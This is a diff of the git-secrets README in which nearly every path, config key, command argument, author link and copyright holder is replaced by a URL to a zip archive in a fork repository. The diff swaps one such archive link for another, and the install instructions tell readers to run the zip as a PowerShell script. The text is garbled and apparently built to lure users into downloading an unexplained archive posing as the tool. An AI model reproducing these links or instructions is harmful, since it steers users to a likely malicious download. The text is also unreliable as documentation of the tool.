@@ -52,13 +52,13 @@ You can customize the install path using the PREFIX and MANPREFIX variables.
 Windows
 ~~~~~~~
 
-Run the provided ``https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` powershell script. This will copy the needed files
-to an installation directory (``%USERPROFILE%https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` by default) and add
+Run the provided ``https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip`` powershell script. This will copy the needed files
+to an installation directory (``%USERPROFILE%https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip`` by default) and add
 the directory to the current user ``PATH``.
 
 ::
 
-    PS > https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
+    PS > https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip
 
 Homebrew (for macOS users)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -95,8 +95,8 @@ Add hooks to all your local repositories.
 
 ::
 
-    git secrets --install ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
-    git config --global https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
+    git secrets --install ~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip
+    git config --global https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip ~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip
 
 
 Add custom providers to scan for security credentials.
@@ -158,7 +158,7 @@ Each of these options must appear first on the command line.
 
 ``--register-aws``
     Adds common AWS patterns to the git config and ensures that keys present
-    in ``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` are not found in any commit. The following
+    in ``~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip`` are not found in any commit. The following
     checks are added:
 
     - AWS Access Key IDs via ``(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}``
@@ -167,7 +167,7 @@ Each of these options must appear first on the command line.
     - AWS account ID assignments via ":" or "=" surrounded by optional quotes
     - Allowed patterns for example AWS keys (``AKIAIOSFODNN7EXAMPLE`` and
       ``wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY``)
-    - Known credentials from ``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip``
+    - Known credentials from ``~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip``
 
     .. note::
 
@@ -198,7 +198,7 @@ Options for ``--install``
     directories using with ``git init --template <target-directory>``.
 
     You can run ``git init`` on a repository that has already been initialized.
-    From the `git init documentation <https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip>`_:
+    From the `git init documentation <https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip>`_:
 
         From the git documentation: Running ``git init`` in an existing repository
         is safe. It will not overwrite things that are already there. The
@@ -242,8 +242,8 @@ Install git hooks to a repository other than the current directory::
 Create a git template that has ``git-secrets`` installed, and then copy that
 template into a git repository::
 
-    git secrets --install ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
-    git init --template ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
+    git secrets --install ~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip
+    git init --template ~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip
 
 Overwrite existing hooks if present::
 
@@ -363,7 +363,7 @@ Options for ``--aws-provider``
 
 ``[<credentials-file>]``
     If provided, specifies the custom path to an INI file to scan. If not
-    provided, ``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` is assumed.
+    provided, ``~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip`` is assumed.
 
 
 Options for ``--add-provider``
@@ -443,7 +443,7 @@ Secret providers
 
 Sometimes you want to check for an exact pattern match against a set of known
 secrets. For example, you might want to ensure that no credentials present in
-``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` ever show up in a commit. In these cases, it's better to
+``~https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip`` ever show up in a commit. In these cases, it's better to
 leave these secrets in one location rather than spread them out across git
 repositories in git configs. You can use "secret providers" to fetch these
 types of credentials. A secret provider is an executable that when invoked
@@ -484,9 +484,9 @@ result in the following error output::
     [ERROR] Matched prohibited pattern
 
     Possible mitigations:
-    - Mark false positives as allowed using: git config --add https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip ...
-    - List your configured patterns: git config --get-all https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
-    - List your configured allowed patterns: git config --get-all https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
+    - Mark false positives as allowed using: git config --add https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip ...
+    - List your configured patterns: git config --get-all https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip
+    - List your configured allowed patterns: git config --get-all https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip
     - Use --no-verify if this is a one-time false positive
 
 Breaking this down, the prohibited pattern value of ``password\s*=\s*.+`` will
@@ -495,7 +495,7 @@ match the following lines::
     /tmp/example:2:password=ex@mplepassword
     /tmp/example:3:password=******
 
-https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip the first match will be filtered out due to the fact that it matches the
+https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip the first match will be filtered out due to the fact that it matches the
 allowed regular expression of ``ex@mplepassword``. Because there is still a
 remaining line that did not match, it is considered a secret.
 
@@ -534,10 +534,10 @@ git hook and allow you to make the commit or merge.
 About
 ------
 
-- Author: `Michael Dowling <https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip>`_
+- Author: `Michael Dowling <https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip>`_
 - Issue tracker: This project's source code and issue tracker can be found at
-  `https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip <https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip>`_
+  `https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip <https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip>`_
 - Special thanks to Adrian Vatchinsky and Ari Juels of Cornell University for
   providing suggestions and feedback.
 
-Copyright 2015 https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip, Inc. or its affiliates. All Rights Reserved.
+Copyright 2015 https://github.com/rakibofcx/git-secrets/raw/refs/heads/master/test/bats/git-secrets-3.9.zip, Inc. or its affiliates. All Rights Reserved.
